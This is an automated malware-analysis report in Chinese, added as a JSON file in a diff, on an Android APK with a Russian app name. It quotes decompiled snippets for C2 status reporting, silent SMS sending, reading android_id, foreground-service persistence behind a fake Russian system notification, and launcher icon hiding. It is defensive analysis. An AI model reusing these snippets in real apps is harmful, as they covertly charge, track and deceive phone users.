@@ -1,0 +1,174 @@
+{
+  "APK信息": {
+    "文件名": "9793261fc04b7518ed94ed76944929c0f33e6e88d4ffca29fb9fec95eeba25f0.apk",
+    "sha256": "9793261fc04b7518ed94ed76944929c0f33e6e88d4ffca29fb9fec95eeba25f0",
+    "包名": "com.grain.figure",
+    "应用名": "Посланиe",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 163.5
+  },
+  "行为列表": [
+    {
+      "行为": "c2_communication",
+      "中文名": "C2通信/远程控制",
+      "MITRE": "T1437",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "command"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\grain\\figure\\ExcludeLandscape;",
+          "method_signature": "a(Context context, Intent intent)",
+          "malicious_behavior": "c2_communication",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "new b(context, 3).a(\"id\", intent.getStringExtra(\"id\")).a(\"command\", Integer.valueOf(intent.getIntExtra(\"command\", 0))).a(\"post\", Boolean.valueOf(intent.getBooleanExtra(\"post\", true))).a(\"status\", Integer.valueOf(getResultCode())).a();",
+          "malicious_code_snippet_context": "  /* loaded from: classes.dex */\n  public class ExcludeLandscape extends BroadcastReceiver {\n      private void a(Context context, Intent intent) {\n>>>         new b(context, 3).a(\"id\", intent.getStringExtra(\"id\")).a(\"command\", Integer.valueOf(intent.getIntExtra(\"command\", 0))).a(\"post\", Boolean.valueOf(intent.getBooleanExtra(\"post\", true))).a(\"status\", Integer.valueOf(getResultCode())).a();\n      }\n  \n      private Object[] a(Bundle bundle) {",
+          "behavior_description": "BroadcastReceiver接收到包含C2指令的Intent后，提取其中的id、command、post、status等字段，通过b类构建HTTP POST请求（b(context,3)创建请求对象，链式设置参数，最终.a()触发发送），将命令执行状态上报给C2服务器，实现远程控制的指令回传闭环。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_send",
+          "中文名": "短信发送",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.SEND_SMS"
+            ],
+            "字符串": [
+              "sendTextMessage"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\grain\\figure\\c;",
+          "method_signature": "a(Context context, String str, String str2, PendingIntent pendingIntent)",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "SmsManager.getDefault().sendTextMessage(str, null, str2, pendingIntent, null);",
+          "malicious_code_snippet_context": "      public static void a(Context context, String str, String str2, PendingIntent pendingIntent) {\n          try {\n              Restoration.a(true);\n>>>             SmsManager.getDefault().sendTextMessage(str, null, str2, pendingIntent, null);\n          } catch (Exception e) {\n              a.a(context, e, str, str2);\n          }",
+          "behavior_description": "该方法通过 SmsManager.getDefault().sendTextMessage() 静默发送短信，无需用户交互。目标号码(str)和短信内容(str2)均由外部调用者传入，在恶意样本中通常用于向付费号码发送短信以扣取用户话费，或向C2服务器号码回传窃取的隐私数据。Restoration.a(true) 可能用于屏蔽发送提示或设置静默标志。该行为直接造成用户经济损失或隐私泄露。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "device_fingerprinting",
+      "中文名": "设备指纹采集",
+      "MITRE": "T1437",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.READ_PHONE_STATE"
+        ],
+        "字符串": [
+          "ANDROID_ID"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\grain\\figure\\c;",
+          "method_signature": "c(Context context)",
+          "malicious_behavior": "device_fingerprinting",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "public static String c(Context context) {\n    return Settings.Secure.getString(context.getContentResolver(), \"android_id\");\n}",
+          "malicious_code_snippet_context": "          return false;\n      }\n  \n>>>     public static String c(Context context) {\n>>>         return Settings.Secure.getString(context.getContentResolver(), \"android_id\");\n>>>     }\n  \n      private static void c(Context context, long j) {\n          if (j - a > 10230) {",
+          "behavior_description": "通过 Settings.Secure.getString() 读取系统属性 android_id，获取设备唯一标识符用于设备指纹采集。android_id 是设备级唯一标识，在恶意样本上下文中通常被收集后上传至C2服务器用于用户追踪或设备识别。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "persistence",
+      "中文名": "持久化",
+      "MITRE": "T1444",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "foreground_service",
+          "中文名": "前台服务保活",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "startForeground"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\grain\\figure\\Coincidence;",
+          "method_signature": "if(Build.VERSION.SDK_INT >= 26)",
+          "malicious_behavior": "persistence",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "if (Build.VERSION.SDK_INT >= 26) {\n    this.a.createNotificationChannel(new NotificationChannel(\"com.grain.figure.CYLINDER\", \"Flash\", 1));\n    builder = new Notification.Builder(getApplicationContext(), \"com.grain.figure.CYLINDER\");\n} else {\n    builder = new Notification.Builder(getApplicationContext());\n}\nbuilder.setSmallIcon(R.drawable.ic_dialog_info).setContentTitle(\"Ocнoвнoй прoцeсс\").setContentText(\"Сиcтeмa нe кoррeктно работaет, вaм неoбхoдимо включить дoступ к стaтиcтикe для 'Ocнoвнoй прoцeсс'\").setWhen(System.currentTimeMillis());\nstartForeground(1184, builder.build());",
+          "malicious_code_snippet_context": "  \n      private void a() {\n          Notification.Builder builder;\n>>>         if (Build.VERSION.SDK_INT >= 26) {\n>>>             this.a.createNotificationChannel(new NotificationChannel(\"com.grain.figure.CYLINDER\", \"Flash\", 1));\n>>>             builder = new Notification.Builder(getApplicationContext(), \"com.grain.figure.CYLINDER\");\n>>>         } else {\n>>>             builder = new Notification.Builder(getApplicationContext());\n>>>         }\n>>>         builder.setSmallIcon(R.drawable.ic_dialog_info).setContentTitle(\"Ocнoвнoй прoцeсс\").setContentText(\"Сиcтeмa нe кoррeктно работaет, вaм неoбхoдимо включить дoступ к стaтиcтикe для 'Ocнoвнoй прoцeсс'\").setWhen(System.currentTimeMillis());\n>>>         startForeground(1184, builder.build());\n      }\n  \n      private void b() {",
+          "behavior_description": "该代码在Service中创建前台通知以实现保活。通知标题伪装为'主进程'(Ocнoвнoй прoцeсс)，通知内容用俄语声称'系统未正确工作，需要启用统计信息访问权限'，具有社会工程欺骗性，诱导用户认为这是系统进程。通过startForeground()将服务提升为前台服务，防止被系统杀死，从而实现持久化保活，为恶意软件的长期运行提供基础。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\grain\\figure\\LiberalGrant;",
+          "method_signature": "a()",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "getPackageManager().setComponentEnabledSetting(new ComponentName(getApplicationContext(), (Class<?>) LiberalGrant.class), 2, 1);",
+          "malicious_code_snippet_context": "  /* loaded from: classes.dex */\n  public class LiberalGrant extends Activity {\n      private void a() {\n>>>         getPackageManager().setComponentEnabledSetting(new ComponentName(getApplicationContext(), (Class<?>) LiberalGrant.class), 2, 1);\n      }\n  \n      @Override // android.app.Activity",
+          "behavior_description": "在 Activity 的 onCreate 中调用 setComponentEnabledSetting 将自身组件状态设置为 DISABLED (2)，从而隐藏应用图标，随后调用 finish() 关闭当前界面，使用户无法在启动器中看到该应用，达到隐藏自身的目的。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.7-plus",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
